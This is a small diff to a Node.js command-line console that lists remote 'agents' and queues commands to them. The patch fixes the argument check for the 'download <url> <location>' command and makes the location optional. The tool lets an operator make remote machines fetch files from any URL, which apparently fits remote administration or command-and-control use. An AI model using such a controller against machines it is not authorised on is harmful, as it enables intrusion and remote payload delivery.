@@ -51,7 +51,7 @@ rl.on('line', line => {
   let [cmd, ...args] = line.split(' ').filter(l => l.length != 0);
 
   if (cmd == 'agent') {
-    if (args[0] == "list") {
+    if (args[0] == 'list') {
       listAgents();
     } else {
       const id = args[0];
@@ -110,7 +110,7 @@ rl.on('line', line => {
 
           case 'download': {
             const [url, location] = args.slice(2);
-            if (id == undefined || download == undefined || location == undefined) {
+            if (id == undefined || url == undefined) {
               console.log('Usage: agent <ID> download <url> <location>');
             } else if (id in agents) {
               download(id, url, location);
@@ -166,7 +166,13 @@ function setTime(id, seconds) {
 }
 
 function download(id, url, location) {
-  console.log(`Downloading ${url} to ${location} on agent ${id}`);
+  if (location == undefined) {
+    location = '';
+    console.log(`Downloading ${url} to current working directory on agent ${id}`);
+  } else {
+    console.log(`Downloading ${url} to ${location} on agent ${id}`);
+  }
+
   agents[id].queueCommand({ type: 'download', data: { url, location } });
 }
 
